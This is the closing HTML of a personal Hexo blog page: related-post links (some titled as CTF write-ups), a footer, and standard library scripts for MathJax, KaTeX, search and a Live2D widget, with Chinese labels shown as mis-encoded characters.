lazyload"data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/redpack.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2023-04-19</div><div class="relatedPosts_title">èµµå¸ˆå‚…çš„æ–°æ˜¥çº¢åŒ…é¢˜</div></div></a></div><div class="relatedPosts_item"><a href="/yakko117/2019/04/05/Bugkuctf/" title="Bugkuå¹å¤´å‘ writeupï¼ˆæ…¢æ…¢æ›´ï¼‰"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/6b8c14f8gy1fvcdnepp5yj218g0tn48s.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2023-04-19</div><div class="relatedPosts_title">Bugkuå¹å¤´å‘ writeupï¼ˆæ…¢æ…¢æ›´ï¼‰</div></div></a></div><div class="relatedPosts_item"><a href="/yakko117/2023/03/16/BUUCTFDay11/" title="BuuctfDay11"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/9a88975fec4255819a88f8d9c73c8948.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2024-01-20</div><div class="relatedPosts_title">BuuctfDay11</div></div></a></div></div><div class="clear_both"></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By Manayakko</div><div class="framework-info"><span>é©±åŠ¨ </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="é˜…è¯»æ¨¡å¼"></i><i class="fa fa-plus" id="font_plus" title="æ”¾å¤§å­—ä½“"></i><i class="fa fa-minus" id="font_minus" title="ç¼©å°å­—ä½“"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="ç®€ç¹è½¬æ¢" target="_self">ç¹</a><i class="darkmode fa fa-moon-o" id="darkmode" title="å¤œé—´æ¨¡å¼"></i></div><div id="rightside-config-show"><div id="rightside_config" title="è®¾ç½®"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="ç›®å½•" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="å›åˆ°é¡¶éƒ¨" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/yakko117/js/utils.js"></script><script src="/yakko117/js/main.js"></script><script src="/yakko117/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>$(function () {
  $('span.katex-display').wrap('<div class="katex-wrap"></div>')
})</script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« "></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>ç”±</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>æä¾›æ”¯æŒ</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/yakko117/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/yakko117/live2dw/assets/assets/shizuku.model.json"},"display":{"position":"right","hOffset":60,"vOffset":-20,"width":90,"height":180},"mobile":{"show":false},"log":false});</script></body></html>